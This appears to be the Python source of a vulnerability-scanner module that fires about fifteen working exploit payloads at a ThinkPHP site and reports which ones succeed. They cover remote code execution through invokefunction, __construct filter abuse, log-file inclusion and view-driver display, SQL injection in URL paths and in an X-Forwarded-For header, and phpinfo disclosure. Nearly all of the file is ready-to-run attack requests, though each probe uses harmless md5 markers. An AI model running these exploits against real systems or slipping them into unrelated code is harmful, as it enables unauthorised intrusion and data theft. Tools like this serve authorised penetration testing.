# coding:utf-8
import time
import datetime
import urllib
import requests
import re
import socket
from urllib.parse import urlparse
from datetime import date, timedelta
from rich.console import Console
import core.code_rprint as rprint
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class thinkphp:

  def __init__(self):
    pass

  def thinkphp2_rce(url):
    relsult = {
      'name': 'Thinkphp 2.x rce',
      'vulnerable': False,
      'attack': True,
    }
    try:
      payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
      response = requests.get(payload, timeout=3)
      if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = payload
        relsult['attack'] = True
        # print("Payload: " + payload)
      return relsult
    except:
      return relsult

  def thinkphp3_rce(url):
    relsult = {
      'name': 'ThinkPHP3.2.x 远程代码执行',
      'vulnerable': False,
      'attack': True,
    }
    url_1 = url+'/index.php?m=--><?=md5(1);?>'
    headers = {
    'Host': 'localhost:8080',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-GB,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Cookie': 'PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;',
    'Upgrade-Insecure-Requests': '1'
    }
    try:
      oH = urlparse(url)
      a = oH.netloc.split(':')
      port = 80
      if 2 == len(a):
        port = a[1]
      elif 'https' in oH.scheme:
        port = 443
      host = a[0]
      #with socket.create_connection((host, port), timeout=10) as conn:

      #conn.send(payload1)
      #req1 = conn.recv(10240).decode()
      s2 = requests.post(url_1,headers=headers)
      today = (date.today() + timedelta()).strftime("%y_%m_%d")
      payload2 = urllib.parse.urljoin(url, 'index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{0}.log'.format(today))
      req2 = requests.get(payload2, timeout=3)
      if re.search(r'c4ca4238a0b923820dcc509a6f75849b', req2.text):
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = payload2
        return relsult
      return relsult
    except:
      return relsult

  def thinkphp_5022_rce(url):
    relsult = {
      'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
      'vulnerable': False,
      'attack': True,
    }
    try:
      payload = urllib.parse.urljoin(url, r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
      response = requests.get(payload, timeout=3, verify=False)
      if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = payload
        relsult['attack'] = True
      return relsult
    except:
      return relsult

  def thinkphp_5023_rce(url):
    relsult = {
      'name': 'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
      'vulnerable': False,
      'attack': True,
    }
    try:
      target = url + '/index.php?s=captcha'
      target = urllib.parse.urljoin(url, '/index.php?s=captcha')
      payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
      headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
      }
      response = requests.post(target, data=payload, timeout=3, verify=False, headers=headers)
      response2 = requests.post(target, timeout=3, verify=False, headers=headers)
      if re.search(r'PHP Version', response.text) and not re.search(r'PHP Version', response2.text):
        relsult['vulnerable'] = True
        relsult['method'] = 'POST'
        relsult['url'] = target
        relsult['position'] = 'data'
        relsult['payload'] = payload
        relsult['attack'] = True
      return relsult
    except:
      return relsult


  def thinkphp5_sqli(url):
    relsult = {
      'name': 'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
      'vulnerable': False
    }
    try:
      payload = urllib.parse.urljoin(url, '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
      response = requests.get(payload, timeout=3, verify=False)
      if re.search(r'XPATH syntax error', response.text):
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = payload
      return relsult
    except:
      return relsult

  def thinkphp_driver_display_rce(url):
    relsult = {
      'name': 'thinkphp_driver_display_rce',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
      vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
      req = requests.get(vurl, headers=headers, timeout=15, verify=False)
      if r"56540676a129760a" in req.text:
        relsult['vulnerable'] = True
        relsult['url'] = url
        relsult['method'] = 'GET'
        relsult['payload'] = vurl
      return relsult
    except:
      return relsult

  def thinkphp_index_construct_rce(url):
    relsult = {
      'name': 'thinkphp_index_construct_rce',
      'vulnerable': False
    }
    headers = {
      "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
      "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
    try:
      vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
      req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
      if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
        relsult['vulnerable'] = True
        relsult['method'] = 'POST'
        relsult['url'] = vurl
        relsult['position'] = 'data'
        relsult['payload'] = payload
      return relsult
    except:
      return relsult


  def thinkphp_index_showid_rce(url):
    relsult = {
      'name': 'thinkphp_index_showid_rce',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
      vurl = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]')
      req = requests.get(vurl, headers=headers, timeout=15, verify=False)
      timenow = datetime.datetime.now().strftime("%Y_%m_%d")[2:]
      vurl2 = urllib.parse.urljoin(url, 'index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C{0}.log'.format(timenow))
      req2 = requests.get(vurl2, headers=headers, timeout=15, verify=False)
      if r"56540676a129760a3" in req2.text:
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = vurl
        relsult['payload'] = vurl2
      return relsult
    except:
      return relsult



  def thinkphp_invoke_func_code_exec(url):
    relsult = {
      'name': 'thinkphp_invoke_func_code_exec',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    controllers = list()
    try:
      req = requests.get(url, headers=headers, timeout=15, verify=False)
    except:
      return relsult
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
      controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))
    for controller in controllers:
      try:
        payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl
        return relsult
      except:
        return relsult


  def thinkphp_lite_code_exec(url):
    relsult = {
      'name': 'thinkphp_lite_code_exec',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
      payload = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
      vurl = urllib.parse.urljoin(url, payload)
      req = requests.get(vurl, headers=headers, timeout=15, verify=False)
      if r"56540676a129760a3" in req.text:
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = vurl
      return relsult
    except:
      return relsult


  def thinkphp_method_filter_code_exec(url):
    relsult = {
      'name': 'thinkphp_method_filter_code_exec',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payload = {
      'c':'var_dump',
      'f':'4e5e5d7364f443e28fbf0d3ae744a59a',
      '_method':'filter',
    }
    try:
      vurl = urllib.parse.urljoin(url, 'index.php')
      req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
      if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
        relsult['vulnerable'] = True
        relsult['method'] = 'POST'
        relsult['url'] = vurl
        relsult['position'] = 'data'
        relsult['payload'] = payload
      return relsult
    except:
      return relsult

  def thinkphp_multi_sql_leak(url):
    relsult = {
      'name': 'thinkphp_multi_sql_leak',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payloads = [
      r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
      r'index.php?s=/home/shopcart/getpriceNum/id/1%27',
      r'index.php?s=/home/user/cut/id/1%27',
      r'index.php?s=/home/service/index/id/1%27',
      r'index.php?s=/home/pay/chongzhi/orderid/1%27',
      r'index.php?s=/home/order/complete/id/1%27',
      r'index.php?s=/home/order/detail/id/1%27',
      r'index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
      for payload in payloads:
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"SQL syntax" in req.text:
          relsult['vulnerable'] = True
          relsult['method'] = 'GET'
          relsult['url'] = url
          relsult['payload'] = vurl
          return relsult
      return relsult
    except:
      return relsult

  def thinkphp_pay_orderid_sqli(url):
    relsult = {
      'name': 'thinkphp_pay_orderid_sqli',
      'vulnerable': False
    }
    headers = {
      "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
      vurl = urllib.parse.urljoin(url, 'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
      req = requests.get(vurl, headers=headers, timeout=15, verify=False)
      if r"56540676a129760a" in req.text:
        relsult['vulnerable'] = True
        relsult['method'] = 'GET'
        relsult['url'] = url
        relsult['payload'] = vurl
      return relsult
    except:
      return relsult

  def thinkphp_request_input_rce(url):
      relsult = {
        'name': 'thinkphp_request_input_rce',
        'vulnerable': False
      }
      headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
      }
      try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=phpinfo&data=1')
        req = requests.get(vurl, headers=headers, timeout=3, verify=False)
        req2 = requests.get(url, headers=headers, timeout=3, verify=False)
        if r"PHP Version" in req.text and r"PHP Version" not in req2.text:
          relsult['vulnerable'] = True
          relsult['method'] = 'GET'
          relsult['url'] = url
          relsult['payload'] = vurl
        return relsult
      except:
        return relsult


  def thinkphp_view_recent_xff_sqli(url):
      relsult = {
        'name': 'thinkphp_view_recent_xff_sqli',
        'vulnerable': False
      }
      headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
      }
      try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/article/view_recent/name/1')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
          relsult['vulnerable'] = True
          relsult['method'] = 'GET'
          relsult['url'] = vurl
          relsult['parameter'] = 'X-Forwarded-For'
          relsult['payload'] = headers['X-Forwarded-For']
        return relsult
      except:
        return relsult

def get_time():
  return datetime.datetime.now().strftime("%Y-%m-%d-%H:%M:%S")

def get_methods(self):
  return (list(filter(lambda m: not m.startswith("_") and callable(getattr(self, m)),dir(self))))

def start_thinkphp(self):
  s2 = thinkphp.thinkphp2_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))
  
  s2 = thinkphp.thinkphp3_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_5022_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_5023_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp5_sqli(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_driver_display_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_index_construct_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_index_showid_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_invoke_func_code_exec(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_lite_code_exec(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_method_filter_code_exec(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_multi_sql_leak(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_pay_orderid_sqli(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_request_input_rce(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))

  s2 = thinkphp.thinkphp_view_recent_xff_sqli(self)
  rprint.info(get_time(), s2['name'] + str(' ' + str(s2['vulnerable'])))